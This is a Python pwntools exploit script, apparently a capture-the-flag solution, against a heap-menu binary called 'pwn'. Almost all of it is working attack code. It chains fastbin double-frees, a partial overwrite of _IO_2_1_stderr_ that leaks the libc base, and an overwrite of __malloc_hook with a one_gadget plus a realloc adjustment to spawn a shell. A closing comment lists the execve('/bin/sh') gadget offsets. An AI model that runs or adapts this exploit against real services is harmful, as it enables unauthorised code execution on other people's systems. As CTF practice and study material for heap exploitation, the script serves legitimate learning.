#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('2.del', str(1))
	sla(':', str(size))
	sa(':', data)

def rm(idx):
	sla('2.del', str(2))
	sla(':', str(idx))

def q():
	sla(':', str(3))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x20, 'A') # idx 0

	p = 'A' * 0x50
	p += p64(0)
	p += p64(0x31)

	ad(0x60, p) # idx 1
	ad(0x80, 'B') # idx 2
	ad(0x20, 'A') # idx 3
	ad(0x60, 'A') # idx 4

	# for fastbin attack to _free_hook
	ad(0x60, 'A') # idx 5
	ad(0x60, 'A') # idx 6


	rm(3)
	rm(0)
	rm(3)

	rm(2) # for patial write to 

	ad(0x20, '\x90') # attack to chunk 2 - 0x10

	ad(0x20, 'A')
	ad(0x20, 'A')

	p = p64(0)
	p += p64(0x71)
	p += '\xdd\x25'
	ad(0x20, p) # patial write to _IO_2_1_stderr_ + 157


	# fastbin attack to _IO__2_1_stderr + 157
	rm(4)
	rm(1)
	rm(4)
	ad(0x60, '\xa0')

	# for alignment
	ad(0x60, 'A')
	ad(0x60, 'A')
	ad(0x60, 'A')
	
	p = 'A' * 0x33
	p += p64(0xfbad3c80)
	p += p64(0) * 3
	p += p8(8)

	ad(0x60, p)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - (0x7ffff7dd2608 - 0x7ffff7a0d000)
	li('libc_base ' + hex(lib.address))

	# fast bin attack to malloc_hook - 0x23
	rm(5)	
	rm(6)	
	rm(5)	

	p = p64(lib.sym['__malloc_hook'] - 0x23)
	ad(0x68, p)
	ad(0x68, 'A') # for ajust
	ad(0x68, 'A') # for ajust


	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[1]

	p = 'A' * (0x13 -8)
	p += p64(one_gadget)
	p += p64(lib.sym['realloc'] + 12)
	ad(0x68, p)

	# get shell
	ru('del')
	sl('1')

	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''
